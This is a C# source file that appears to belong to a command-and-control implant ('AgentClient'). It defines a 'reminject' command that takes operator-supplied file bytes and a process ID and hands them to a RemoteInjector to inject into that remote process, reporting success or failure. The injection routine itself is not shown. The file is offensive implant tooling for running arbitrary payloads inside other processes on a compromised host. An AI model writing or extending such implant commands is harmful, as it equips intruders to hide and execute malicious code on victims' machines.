using AgentClient.Application.Services.InjectService;
using AgentClient.Domain.Models.Agents;

namespace AgentClient.Application.Commands
{
    public class RemoteInject : AgentCommand
    {
        public override string Name => "reminject";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes == null)
            {
                return "FileBytes must not be null";
            }

            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                return "Invalid PID Argument";
            }

            var injector = new RemoteInjector();
            
            var success = injector.Inject(task.FileBytes, pid);

            if (success) return "Successful injection";
            else return "Injection failed";
        }
    }
}
